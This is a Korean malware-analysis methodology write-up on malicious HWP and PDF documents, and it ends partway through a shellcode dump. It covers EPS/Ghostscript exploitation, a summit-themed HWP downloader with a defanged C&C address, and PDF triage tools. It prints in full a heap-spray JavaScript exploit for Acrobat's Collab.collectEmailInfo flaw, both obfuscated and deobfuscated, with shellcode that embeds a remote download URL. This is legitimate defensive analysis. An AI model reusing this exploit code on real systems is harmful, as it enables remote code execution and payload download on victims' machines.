# 윈도우 문서형 악성코드 분석 방법론
##### 작성자 : 김평일 대리, 정한울 대리, 김태현 사원, 강하늘 사원
##### 작성일자 : 2024년 6월 1일
</br></br>

## (1) 문서 파일 개요

### 1-1 문서 파일(MS Office) 구조




## (2) 한글 파일 개요

### 2-1 한글 파일 악성코드 개요

HWP 한글 문서형 악성코드는 문서 파일 열람 시 악성코드에 감염되는 유형으로, 주로 한글 프로그램을 사용하는 공공기관이나 가상화폐 관련 기업 등의 대상을 공격하는 타깃형 공격이 2010년 이후부터 꾸준히 발생함.

악성 HWP 문서의 상당수가 EPS를 이용하여 악성 행위를 수행함. 

`EPS란?
Encapulated PostScript의 약자로, Adobe에서 만든 PostScript 언어를 이용하여 그래픽 이미지를 표현하는 파일임. 이를 이용하여 각종 고화질 벡터 이미지를 표현할 수 있어, HWP에서는 EPS 이미지를 포함하거나 볼 수 있는 기능이 존재함.`

EPS에서 사용한 CVE-2017-8291 취약점은 고스트스크립트(Ghostscript) 인터프리터가 '.eqproc' 함수에서 매개변수 타입 유효성을 검증하지 않아 피연산자 스택의 메모리가 변조됨. 즉, 악의적인 PostScript 파일로 스택을 변조함으로써 임의 코드를 실행할 수 있는 것임.

2017년 02월 23일에 한글과컴퓨터에서 EPS 파일 처리 과정의 취약점을 조치하여 최신 업데이트가 적용된 HWP는 EPS를 이용한 악성코드가 동작하지 않음. 하지만 여전히 예전 버전을 사용하는 사용자, 관공서가 많이 때문에 해당 악성코드는 꾸준히 배포되고 있음.

### 2-2 한글 파일 구조

한글 2002부터 한글 2018까지 출시된 한글 프로그램은 기본적으로 5.0버전의 한글 문서 파일 형식으로 한글 파일(.hwp)를 생성함.

한글 문서 파일 형식 5.0은 OLE(Object Linking and Embedding) 파일을 기반으로 하여 여러 개의 Storage와 Stream으로 구성되어 있음.

`OLE(Object Linking and Embedding) : Microsoft가 개발한 기술로, 문서와 기타 객체에 연결과 삽입을 도와주는 연결 규약임. 여기서 정보 객체를 OLE Object라고 하며 OLE Object에는 문서, 동영상, 소리, 그림, 수식, 표 등을 하나의 Object로 포함함. 쉽게 설명하면 사진 문서를 올릴 때 문서에 포함된 사진 데이터는 하나의 Object가 됨.
`

또한, 파일 크기를 최소화하기 위해 압축 기능을 사용하는데, 그림 관련 데이터를 포함한 일부 스트림은 파일의 크기를 줄이기 위해 zlib로 압축해서 저장하는 방식을 사용함.

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/8dd58bcd-01f5-4623-8b1a-a0d26ba535c2)

하나의 스트림에는 일반적인 바이너리나 레코드 구조로 데이터가 저장되고, 스트림에 따라 압축 및 암호화되기도 함. 위 표에서 바이너리 데이터를 의미하는 BinData라는 스토리지가 존재하는데, 여기에 그림 또는 OLE Object가 zlib으로 압축되어 저장됨.

이처럼 한글 문서에 그림 파일을 삽입할 수 있으며 삽입 가능한 파일 포맷중에 EPS 파일이 포함되어 있음. 그리고 **한글 파일에 포함된 EPS 파일은 BinData 스토리지에 각각의 스트림으로 zlib으로 압축되어 저장됨.**

### 2-3 EPS 파일 로드 과정

EPS(Encapsulated PostScript) 파일은 포스트스크립트 프로그래밍 언어로 작성된 규격화된 파일로, 단일 그래픽 이미지를 표현함. 이러한 EPS 파일을 화면에 표현하기 위해 인터프리터가 필요하며 한글 프로그램에는 인터프리터인 고스트스크립트(GhostScript)를 내장하고 있음.

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/096a6703-890b-45f1-a220-02f817b587f5)

기본적으로 위와 같이 4개의 파일로 구성되어 있으며, 인터프리팅 기능을 하는 핵심 파일은 gsdll32.dll 라이브러리임. 이외에 실행 파일들은 라이브러리 함수를 호출하는 역할을 하며 한컴에서 제작한 gbb.exe 파일을 제외하면 모두 공개된 고스트스크립트 소스로 컴파일된 파일임.
- gbb.exe : 한컴에서 제작한 포스트스크립트 인터프리터로 gsdll32.dll 로드해서 동작함
- gsdll32.dll : 고스트스크립트 인터프리터 핵심 라이브러리
- gswin32.exe : 고스트스크립트 인터프리터 GUI 버전으로 gsdll32.dll 로드해서 동작
- gswind32c.exe : 고스트스크립트 인터프리터 커맨드 버전으로 gsdll32.dll 로드해서 동작

#### 1) 프로세스

한글 프로그램은 문서를 읽는 과정에서 EPS 이미지가 포함된 페이지가 로드될 때 이를 화면에 표현하기 위해 고스트스크립트 인터프리터인 gbb.exe 파일고 gswind32c.exe 파일이 순차적으로 실행됨. **즉, Hwp.exe 프로세스는 Child Process로 gbb.exe와 gswin32c.exe 프로세스를 실행할 때 표현 대상인 EPS 파일을 실행 인자로 전달하여 그래픽 이미지를 화면에 표시하는 것임.**

위에서 설명했듯이 EPS파일(스트림)은 BinData Storage에 .zlib으로 압축되어 저장되어 있기 때문에, **Hwp.exe 프로세스는 먼저 .zlib 압축을 풀어 임시 파일을 생성하고, 생성된 임시 파일을 고스트스크립트 인터프리터가 처리할 수 있도록 생성된 임시 파일경로를 인자로 전달함.**

추가로, EPS 파일이 문서의 첫 번째가 아닌 다른 페이지에 삽입된 경우 해당 페이지가 화면에 로드될 때 고스트스크립트가 실행되어 동작하지만, 실제 악성 한글 파일의 대부분은 문서를 열자마자 악의적인 기능이 동작하도록 첫 번째 페이지에 삽입되어 있음.

#### 2) 요약

Hwp.exe 프로세스가 EPS 파일을 처리할 때 .zlib으로 압축되어 있는 EPS파일(스트림)을 압축해제하고 임시 파일을 만들어 해당 파일 경로를 인자로 고스트스크립트 인터프리터인 gbb.exe, gswin32c.exe 프로세스를 호출하면서 전달하며, 두 프로세스는 취약점이 존재하는 gsdll32.dll 라이브러리를 로드하여 사용함. 이때, Type Confusion 취약점이 발생하는 .eqproc 함수를 사용하게 됨.

## (3) 한글 파일 악성코드 상세 분석

sample2_xup0zGn.hwp에 대한 상세 분석 프로세스임<br><br>
`파일 정보`<br><br>

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/8f899c4d-e7f5-4b78-92b1-cd922b59d5ab)

해당 한글 악성코드는 도널드 트럼프 미국 대통령과 김정은 북한 국무위원장이 2019년 2월 27-28일 베트남 하노이에서 가졌던 2차 북미 정상회담 결과에 대한 특별좌담회 문서파일을 미끼로 사용하였음.

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/a60b9831-b0aa-4504-9d54-a382e16e0ee0)

해당 악성코드 또한 EPS를 이용한 악성행위를 수행함.

### 3-1 행위 분석

한글 문서를 실행시키면 쉘코드가 바로 실행됨. Procmon 프로그램의 Process Tree 기능을 이용하여 현재 한글문서 하위에 실행되는 프로세스들을 확인할 수 있음.

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/2376412a-af83-41f0-8912-0589f5567fad)

EPS 파일을 포함한 한글 문서가 이미지를 로드할 때, OLE 구조상 EPS 파일은 임시파일 형태로 BinData 폴더에 생성됨. 한글 프로세스는 생성된 임시 파일을 인터프리터가 전달받아 처리하도록 gbb.exe 프로세스와 gswin32c.exe 프로세스에 임시 파일 경로를 인자로 전달하여 실행됨.

따라서 위 사진과 같이 한글 프로세스 하위에 2개의 gbb.exe, gswin32c.exe 프로세스가 실행되고 있는 것을 확인할 수 있음. 하지만 각 프로세스의 하위에서 iexplore.exe가 injection 되어 있음. 이는 사용자의 눈에 보이지 않게 동작하며, 실제 악성행위는 해당 iexplorer.exe 내부에서 일어날 것으로 유추됨.

### 3-2 악성코드 추출(EPS - PostScript)

한글 문서 내부에 들어 있는 EPS 파일을 추출하기 위해 '누리랩'에서 개발한 HWp2Scan 프로그램을 이용함. 이를 통해 한글 문서의 취약점을 확인할 수 있으며 EPS 파일을 추출할 수 있음.

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/f07df3f9-7abd-403c-bde3-f3773162f5d5)

취약점 검사 기능을 이용하면 현재 검사하고 있는 한글 문서에 존재하는 취약점을 확인할 수 있음. 현재 검사하고 있는 문서에선 취약점이 발견되고 있지 않은데, 이는 악성 PostScript 파일은 콛가 암호화되어 검사 로직에서 확인되지 않기 때문임.

우선 BinData 안에 있는 BIN003.eps 파일을 추출함. 참고로 BinData 폴더는 압축된 상태이므로 추출 옵션 중 'Save a Hex(Decompress)'을 이용해야함.

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/82aebe58-a90e-437a-8a3f-f12c45197911)

인코딩된 PostScript 파일을 Sublime Text로 확인한 결과임. 첫 번째 라인의 꺽쇄 다음으로 시작하는 이어지는 문자열이 쉘코드임. 해당 PostScript를 실행시키면 XOR연산을 통해 인코딩된 쉘코드가 복호화되고 실행됨.

복호화된 쉘코드를 얻기 위해 12라인의 exec를 print로 변경하여 헥사값을 얻어낼 수 있음. 이렇게 하면 따로 PostScript의 문법을 몰라도 원하는 복호화 결과를 얻을 수 있음.

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/4ea32377-abcd-4ea0-b7bc-caf641f108da)

코드를 수정하고 mal.eps로 새로 저장함.

### 3-3 PostScript 실행

PostScript는 GhostScript를 이용하여 실행시킬 수 있음.

다운로드 링크 : https://github.com/ArtifexSoftware/ghostpdl-downloads/releases/tag/gs926

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/9416403c-9a06-405b-9cc9-8dae73a4a867)

PosrtScript의 마지막 exec 부분을 print로 변경하여 복호화된 코드가 출력됨. 출력 결과를 확인해보면 다음과 같음.

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/2a70aa69-0ba0-4b41-b65e-9b0c3508f634)

복호화된 코드는 9090..으로 시작하며, 이는 쉘코드의 nop 영역임을 유추할 수 있음. 따라서 해당 쉘코드로 추정되는 놈을 실행시켜봐야함.

### 3-4 Shellcode 분석

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/1c13ffd5-0918-4462-a598-534ec64340ab)

Shellcode2EXE를 이용하여 쉘코드를 exe로 변환시키면 다음과 같음

추출한 실제 쉘코드는 암호화되어 있으며, XOR로 복호화가 진행되고 jmp로 이동하여 실제 동작이 진행됨. C&C 서버는 현재 닫혀 있으므로 Any Run Sandbox를 이용해 추가 정보를 확인해야함.

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/cfd0da78-037d-4788-939e-e038ef4f6b10)

쉘코드 내부에서 " http[:]//itoassn[.]mireene[.]co[.]kr" 주소로 Request를 보내는 것을 확인할 수 있음. 자세한 주소는 디버거를 통해 확인할 수 있으며 다음과 같음 " http[://]itoassn[.]mireene[.]co[.]kr/shop/shop/mail/com/mun/down[.]php ".

해당 서버에서 추가적인 악성코드를 요청하게 되고, 이는 VBE라는 파일을 다운로드 받게 함. 해당 파일은 여러번 인코딩된 URL을 포함하고 이를 디코딩하여 난독화된 VBS 코드를 얻을 수 있고, 이를 해제하여 코드 원본을 확인할 수 있음.

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/783eac54-a3ed-4784-a19a-4f788a09428a)

난독화된 VBS 코드와

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/96d32f27-5ad0-4fdd-90d0-165031261307)

난독화가 해제된 VBS 코드

### 3-5 정리

sample2_xup0zGn.hwp는 CVE-2017-8291 취약점을 이용하여 공격하는 다운로더형 악성코드로, 파일 실행 시 내부에 있는 EPS파일에서 쉘코드가 실행.

쉘코드가 실행되면 " http[://]itoassn[.]mireene[.]co[.]kr/shop/shop/mail/com/mun/down[.]php"에서 추가로 악성코드를 다운받도록 구성되어 있음.

## (4) PDF 파일 개요

### 4-1 PDF 파일 구조

PDF의 구조는 다음과 같이 구성되어 있음. 시그니처 및 버전을 나타내는 Header와 PDF문서의 내용이 들어가 있는 Body, 객체들이 참조할 때 사용되는 정보가 있는 Xref Table, 그리고 파일 구조를 추적할 수 있는 File Trailer가 존재함.

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/abea70d1-088c-4461-bd8d-efee550e11a3)

## (5) PDF 파일 분석 도구
### 5-1 pdfid

pdfid는 pdfid.py 형태로 존재하며, PDF의 악성 여부를 신속히 식별하기 위해 특정 키워드를 찾는 "키워드 검색 도구"임. 이를 통해 PDF파일 내에 자바스크립트 랙션, 삽입된 파일 등 잠재적으로 위험한 요소가 있는지 검사할 수 있음.

다운로드 링크 : https://pypi.org/project/pdfid/ , 혹은 `pip install pdfid`, 혹은 `sudo apt install pdfid`

악성 키워드는 다음과 같음.

- /OpenAction, /AA : 문서를 열 때 액션을 트리거
- /JavaScript, /JS, /AcroForm, /XFA : 자바스크립트 코드 지정 및 실행
- /URL : 외부 URL 접근
- /SubmitForm, /GoToR : 외부 URL로 데이터 전송
- /RichMedia : 문서에 플래시 삽입
- /ObjStm : 객체 스트림에 데이터 숨김
- /XObject : 피싱 이미지 삽입
- /EmbeddedFile : 스트림에 외부 파일 삽입
- /Filter : 인코딩됨

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/44c3bef6-165e-434f-897f-520ed006c99f)

상기 언급한 키워드를 발견했을 경우, 해당 키워드에 대한 객체 ID룰 찾고 그 내용을 덤프하여 세부 내용을 조사해야함.

### 5-2 peepdf

peepdf는 PDF파일을 심층 분석할 수 있도록 설계된 포렌식 도구임. PDF 문서의 객체와 스트림(키워드)를 상세히 탐색하고 악성 요소를 식별할 수 있도록 함.

다운로드 링크 : https://pypi.org/project/peepdf/0.3.2/, 혹은 `pip install peepdf==0.3.2`

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/6c09adcc-79c2-4ee4-a8b5-d07afa753a91)

실행하면 다음과 같이 PDF에 대한 메타데이터를 확인할 수 있음. 가장 중요한 부분은 악성 스트림에 대한 오브젝트 넘버를 확인할 수 있는 부분임.

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/34254108-aa8b-4d6f-acad-ac87ea1d35e0)

탐지한 악성 스트림에 대한 오브젝트를 살펴 보면 다음과 같이 악성 행위를 탐지할 수 있음.

### 5-3 pdf-parser

pdf-parser는 PDF 문서에서 데이터를 식별하고 추출하며 덤프할 수 있는 도구임. pdfid와 peepdf로 의심스러운 객체 ID가 식별되면, pdf-parser를 사용하여 의심스러운 객체 콘텐츠를 덤프할 수 있음.

다운로드 링크 : https://pypi.org/project/py-pdf-parser/, 혹은 `pip install py-pdf-parser`

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/f792f868-bd5a-43d8-88ec-0094f7fd50de)

`pdf-parser.py -o 50 --raw -f <파일 이름>`

다음과 같이 객체 50에 대한 세부 정보가 표시됨. 추가로, 해당 객체를 txt 형식으로 다음과 같이 덤프할 수 있음.

`pdf-parser.py -o 50 --raw -f 파일 이름 > result.txt`

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/e3df216d-2dae-48ae-a5c6-335e6786a306)

### 5-4 REMnux

REMnux는 리버스 엔지니어링 및 악성코드 분석 시 필요한 도구와 툴킷들이 포함되어 있는 리눅스 기반 배포판임. 위에서 언급한 도구들이 기본적으로 탑재되어 있어, 별도의 설치 필요없이 분석 환경을 구성할 수 있음. 악성코드는 기본적으로 가상환경에서 분석을 진행해야 하므로 REMnux에서 분석을 진행할 것을 권장함.

다운로드 링크 : https://remnux.org/

## (6) PDF 악성코드 샘플 분석
위에서 설명한 도구를 이용하여 샘플을 분석하는 프로세스를 설명함. 해당 샘플은 URL 기반 조사임.

### 6-1 pdfid를 이용한 의심스러운 객체 식별

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/61167d9a-f3b8-44bc-930e-4b607b426585)

pdfid로 악성 PDF를 조사한 결과, /URL에 대한 키워드가 26개 발견됨. /URL 키워드는 외부 URL 접근을 의미하므로 악성 행위가 의심됨.

### 6-2 peepdf를 이용한 /URL 객체 ID 식별

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/9d7925c9-38bd-4ec9-ac90-0e64424788fc)

peepdf를 이용하여 /URL의 객체 ID를 식별함. 여기서는 10,17,18,19,20,21,22,23,24,25,26,27,28에 해당하는 것을 알 수 있음.

### 6-3 pdf-parser를 이용한 URL 특정하기

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/90c040ec-3140-4ad7-81fa-db3a811a0230)

pdf-parser를 이용하여 /URL 객체 ID에 대한 데이터를 추출할 수 있음.

`pdf-parser.py -o 10,17,18,19,20,21,22,23,24,25,26,27,28 <파일 이름>`

다음과 같이 URL이 확인됨을 알 수 있고, virustotal 또는 기타 분석 도구를 사용하여 악성 여부를 판단할 수 있음.

## (7) PDF 악성코드 상세 분석
bad.pdf에 대한 상세 분석 프로세스임

`파일 정보`

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/bee18d0f-d2b6-4c44-8b5d-075800aa2d64)

### 7-1 PDF 내부 의심스러운 키워드 찾기

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/99f8a79f-85af-4e93-8bf2-f28eb2d400a3)

pdfid를 이용하여 의심스러운 키워드를 찾으면 다음과 같음. 의심스러운 키워드로는 /JS가 2개, /JavaScript가 3개, /OpenAction이 1개 존재함.
즉, bad.pdf 파일에는 자바스크립트가 존재하고, 해당 PDF 문서를 열어봄과 동시에 무엇인가 행위를 트리거하도록 구성되어 있음을 파악할 수 있음.

### 7-2 PDF 파일 내 객체 ID 분석

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/5e52e10b-2e3d-470f-a6a3-7dfc452c30f4)

`$ pdf-parser.py --search /OpenAction bad.pdf`

PDF 문서를 열면 가장 먼저 /OpenAction 키워드에 정의되어 있는 스크립트가 실행됨. 위 이미지와 같이 this.zfnvkWYOKv() 함수가 실행됨을 알 수 있으나 자세한 스크립트는 확인이 불가능함. 이를 확인하기 위해서는 obj 1이 참조하고 있는 obj 2, 3, 4, 5, 6, 7을 확인해야함.

Referencing : 2 0 R, 3 0 R, 4 0 R, 5 0 R, 6 0 R, 7 0 R을 통해 참조 여부를 확인할 수 있음

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/f8e76f94-d7e1-48f8-8dc9-83a4f140ebe4)

`$ pdf-parser.py --search /JavaScript badpdf.pdf`

obj 1에서 실행되는 스크립트가 자바스크립트임을 확인했기 때문에 /JavaScript 키워드를 기반으로 검색함. 검색 결과 obj 7도 obj 10을 참조할 수 있음을 알 수 있고, obj 12에서도 /JavaScript 키워드가 발견되었으며 obj 13을 참조하고 있음. 따라서 obj 10과 obj 13을 추가로 확인해볼 필요가 있음.

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/80cfd793-b225-4ce9-9cd5-84c053ed9ac4)

`$ pdf-parser.py --object 10 badpdf.pdf`
`$ pdf-parser.py --object 13 badpdf.pdf`

obj 10과 obj 13을 확인해보면 각각 obj 10은 obj 12를 참조하고 있고 obj 13은 데이터 스트림이 포함되어 있음을 확인할 수 있음. 따라서 실제 실행하는 악성 스크립트는 obj 13에 포함된 스트림을 분석하면 알 수 있음.

### 7-3 PDF 구조

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/2db12b84-950b-4515-bf0c-2015b0c694df)

해당 PDF 악성코드는 위와 같은 순서로 참조하여 스크립트를 실행함. 제일 먼저 PDF 문서를 열면 obj 1에서부터 시작해서 obj 13까지 참조하여 스크립트를 실행함.

### 7-4 자바스크립트 분석

![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/59d6f735-1727-445c-9438-7a638194251a)

`$ pdf-parser.py --object 13 --raw --filter badpdf.pdf`

obj 13을 보면 obj 1에서 확인했던 zfnvkWYOKv() 함수의 실제 스트림이 포함되어 있으며 FlateDecode 방식으로 인코딩되어 있음을 확인할 수 있음. pdf-parser에서 --filter 옵션을 사용하면 FlatDecode, ASCIIHexDecode, ASCII85Decode, LZWDecode, RunLengthDecode까지 디코딩이 가능함. 따라서 --raw --filter 옵션을 붙여주어 obj 13에 포함된 zfnvkWYOKv() 함수를 확인할 수 있음.

```javascript
function zfnvkWYOKv()
{
        gwKPaJSHReD0hTAD51qao1s = unescape("%u4343%u4343%u0feb%u335b%u66c9%u80b9%u8001%uef33%ue243%uebfa%ue805%uffec%uffff%u8b7f%udf4e%uefef%u64ef%ue3af%u9f64%u42f3%u9f64%u6ee7%uef03%uefeb%u64ef%ub903%u6187%ue1a1%u0703%uef11%uefef%uaa66%ub9eb%u7787%u6511%u07e1%uef1f%uefef%uaa66%ub9e7%uca87%u105f%u072d%uef0d%uefef%uaa66%ub9e3%u0087%u0f21%u078f%uef3b%uefef%uaa66%ub9ff%u2e87%u0a96%u0757%uef29%uefef%uaa66%uaffb%ud76f%u9a2c%u6615%uf7aa%ue806%uefee%ub1ef%u9a66%u64cb%uebaa%uee85%u64b6%uf7ba%u07b9%uef64%uefef%u87bf%uf5d9%u9fc0%u7807%uefef%u66ef%uf3aa%u2a64%u2f6c%u66bf%ucfaa%u1087%uefef%ubfef%uaa64%u85fb%ub6ed%uba64%u07f7%uef8e%uefef%uaaec%u28cf%ub3ef%uc191%u288a%uebaf%u8a97%uefef%u9a10%u64cf%ue3aa%uee85%u64b6%uf7ba%uaf07%uefef%u85ef%ub7e8%uaaec%udccb%ubc34%u10bc%ucf9a%ubcbf%uaa64%u85f3%ub6ea%uba64%u07f7%uefcc%uefef%uef85%u9a10%u64cf%ue7aa%ued85%u64b6%uf7ba%uff07%uefef%u85ef%u6410%uffaa%uee85%u64b6%uf7ba%uef07%uefef%uaeef%ubdb4%u0eec%u0eec%u0eec%u0eec%u036c%ub5eb%u64bc%u0d35%ubd18%u0f10%u64ba%u6403%ue792%ub264%ub9e3%u9c64%u64d3%uf19b%uec97%ub91c%u9964%ueccf%udc1c%ua626%u42ae%u2cec%udcb9%ue019%uff51%u1dd5%ue79b%u212e%uece2%uaf1d%u1e04%u11d4%u9ab1%ub50a%u0464%ub564%ueccb%u8932%ue364%u64a4%uf3b5%u32ec%ueb64%uec64%ub12a%u2db2%uefe7%u1b07%u1011%uba10%ua3bd%ua0a2%uefa1%u7468%u7074%u2F3A%u372F%u2E38%u3031%u2E39%u3033%u352E%u632F%u756F%u746E%u302F%u3530%u4441%u3635%u2F46%u6F6C%u6461%u702E%u7068%u703F%u6664%u613D%u3836%u6534%u6563%u6565%u3637%u6366%u3235%u3732%u3337%u3832%u6136%u3938%u6235%u3863%u3334%u0036");

        tuVglXABgYUAQFEYVPi3lf = unescape("%u9090%u9090"); nDsGdY1TdZUDCCpNeYRdk28BeZ5R = 20 + gwKPaJSHReD0hTAD51qao1s.length
        while (tuVglXABgYUAQFEYVPi3lf.length < nDsGdY1TdZUDCCpNeYRdk28BeZ5R) tuVglXABgYUAQFEYVPi3lf += tuVglXABgYUAQFEYVPi3lf;
        vmRV3x9BCtZs = tuVglXABgYUAQFEYVPi3lf.substring(0, nDsGdY1TdZUDCCpNeYRdk28BeZ5R);
        dVghsR4KOJoE6WzWkTW0vz = tuVglXABgYUAQFEYVPi3lf.substring(0, tuVglXABgYUAQFEYVPi3lf.length-nDsGdY1TdZUDCCpNeYRdk28BeZ5R);
        while(dVghsR4KOJoE6WzWkTW0vz.length + nDsGdY1TdZUDCCpNeYRdk28BeZ5R < 0x40000) dVghsR4KOJoE6WzWkTW0vz = dVghsR4KOJoE6WzWkTW0vz + dVghsR4KOJoE6WzWkTW0vz + vmRV3x9BCtZs;

        dddA9SvmIp7bFVTvbRcRoFQ = new Array();

        for ( i = 0; i < 2020; i++ ) dddA9SvmIp7bFVTvbRcRoFQ[i] = dVghsR4KOJoE6WzWkTW0vz + gwKPaJSHReD0hTAD51qao1s;

        function rHjX2qS2YpWWuvNjX9JfKZ3F(qlrSKFKRQUuUXlV0ES9I6oz4pM, oq7g9J0RSV3FcMgr9DLvvDY8ee)
        {
                var lTZGviUaML2vE40mHbYk = "";

                while (--qlrSKFKRQUuUXlV0ES9I6oz4pM >= 0) lTZGviUaML2vE40mHbYk += oq7g9J0RSV3FcMgr9DLvvDY8ee;
                return lTZGviUaML2vE40mHbYk;
        }

        Collab.collectEmailInfo({msg:rHjX2qS2YpWWuvNjX9JfKZ3F(4096, unescape("%u0909%u0909"))});
}
```


obj 13에 포함되어 있는 자바스크립트는 위와 같이 난독화가 되어있음. 우선 제일 첫 번째 변수 gwKPaJSHReD0hTAD51qao1s를 보면 hex값이 존재하는 것을 볼 수 있는데 이 공격코드의 핵심으로 유추됨. 해당 자바스크립트의 난독화를 해제해서 해석을 하면 다음과 같음.


```function zfnvkWYOKv()
{
        shellcode = unescape("%u4343%u4343%u0feb%u335b%u66c9%u80b9%u8001%uef33%ue243%uebfa%ue805%uffec%uffff%u8b7f%udf4e%uefef%u64ef%ue3af%u9f64%u42f3%u9f64%u6ee7%uef03%uefeb%u64ef%ub903%u6187%ue1a1%u0703%uef11%uefef%uaa66%ub9eb%u7787%u6511%u07e1%uef1f%uefef%uaa66%ub9e7%uca87%u105f%u072d%uef0d%uefef%uaa66%ub9e3%u0087%u0f21%u078f%uef3b%uefef%uaa66%ub9ff%u2e87%u0a96%u0757%uef29%uefef%uaa66%uaffb%ud76f%u9a2c%u6615%uf7aa%ue806%uefee%ub1ef%u9a66%u64cb%uebaa%uee85%u64b6%uf7ba%u07b9%uef64%uefef%u87bf%uf5d9%u9fc0%u7807%uefef%u66ef%uf3aa%u2a64%u2f6c%u66bf%ucfaa%u1087%uefef%ubfef%uaa64%u85fb%ub6ed%uba64%u07f7%uef8e%uefef%uaaec%u28cf%ub3ef%uc191%u288a%uebaf%u8a97%uefef%u9a10%u64cf%ue3aa%uee85%u64b6%uf7ba%uaf07%uefef%u85ef%ub7e8%uaaec%udccb%ubc34%u10bc%ucf9a%ubcbf%uaa64%u85f3%ub6ea%uba64%u07f7%uefcc%uefef%uef85%u9a10%u64cf%ue7aa%ued85%u64b6%uf7ba%uff07%uefef%u85ef%u6410%uffaa%uee85%u64b6%uf7ba%uef07%uefef%uaeef%ubdb4%u0eec%u0eec%u0eec%u0eec%u036c%ub5eb%u64bc%u0d35%ubd18%u0f10%u64ba%u6403%ue792%ub264%ub9e3%u9c64%u64d3%uf19b%uec97%ub91c%u9964%ueccf%udc1c%ua626%u42ae%u2cec%udcb9%ue019%uff51%u1dd5%ue79b%u212e%uece2%uaf1d%u1e04%u11d4%u9ab1%ub50a%u0464%ub564%ueccb%u8932%ue364%u64a4%uf3b5%u32ec%ueb64%uec64%ub12a%u2db2%uefe7%u1b07%u1011%uba10%ua3bd%ua0a2%uefa1%u7468%u7074%u2F3A%u372F%u2E38%u3031%u2E39%u3033%u352E%u632F%u756F%u746E%u302F%u3530%u4441%u3635%u2F46%u6F6C%u6461%u702E%u7068%u703F%u6664%u613D%u3836%u6534%u6563%u6565%u3637%u6366%u3235%u3732%u3337%u3832%u6136%u3938%u6235%u3863%u3334%u0036");
        nop = unescape("%u9090%u9090");
        //shellcode.length = 245
        nop_length = 20 + shellcode.length;
        while (nop.length < nop_length) nop += nop;		//nop.length = 512
        dummy1 = nop.substring(0, nop_length);
        final_dummy = nop.substring(0, nop.length-nop_length);
        while(final_dummy.length + nop_length < 0x40000) final_dummy = final_dummy + final_dummy + dummy1;

        payload = new Array();

        for ( i = 0; i < 2020; i++ ) payload[i] = final_dummy + shellcode;

        function overflow(loop, ascii_0x9)
        {
                var payload2 = "";

                while (--loop >= 0) payload2 += ascii_0x9;
                return payload2;
        }

        Collab.collectEmailInfo({msg:overflow(4096, unescape("%u0909%u0909"))});}
```

난독화된 자바스크립트는 변수 및 함수명만 난독화가 되어 있고, 난독화된 자바스크립트를 해석하면 위와 같음.

- 261,879개의 NOP(0x90) 뒤에 쉘코드를 붙여서 NOP Sled 공격 코드 구성
- NOP Sled 공격코드를 2020개를 구성하여 페이로드 구성
- Collab.collectEmailInfo() 함수의 취약점(CVE-2007-5659)을 이용하여 Heap Spray 공격을 수행하고, 공격 시 Heap 영역에 할당한 쉘코드를 실행

결과적으로 해당 악성 자바스크립트는 CVE-2007-5659 취약점을 사용해서 쉘코드를 실행하도록 구성되어 있음.

### 7-5 쉘코드 분석
`
$ cat shellcode_unicode 
%u4343%u4343%u0feb%u335b%u66c9%u80b9%u8001%uef33%ue243%uebfa%ue805%uffec%uffff%u8b7f%udf4e%uefef%u64ef%ue3af%u9f64%u42f3%u9f64%u6ee7%uef03%uefeb%u64ef%ub903%u6187%ue1a1%u0703%uef11%uefef%uaa66%ub9eb%u7787%u6511%u07e1%uef1f%uefef%uaa66%ub9e7%uca87%u105f%u072d%uef0d%uefef%uaa66%ub9e3%u0087%u0f21%u078f%uef3b%uefef%uaa66%ub9ff%u2e87%u0a96%u0757%uef29%uefef%uaa66%uaffb%ud76f%u9a2c%u6615%uf7aa%ue806%uefee%ub1ef%u9a66%u64cb%uebaa%uee85%u64b6%uf7ba%u07b9%uef64%uefef%u87bf%uf5d9%u9fc0%u7807%uefef%u66ef%uf3aa%u2a64%u2f6c%u66bf%ucfaa%u1087%uefef%ubfef%uaa64%u85fb%ub6ed%uba64%u07f7%uef8e%uefef%uaaec%u28cf%ub3ef%uc191%u288a%uebaf%u8a97%uefef%u9a10%u64cf%ue3aa%uee85%u64b6%uf7ba%uaf07%uefef%u85ef%ub7e8%uaaec%udccb%ubc34%u10bc%ucf9a%ubcbf%uaa64%u85f3%ub6ea%uba64%u07f7%uefcc%uefef%uef85%u9a10%u64cf%ue7aa%ued85%u64b6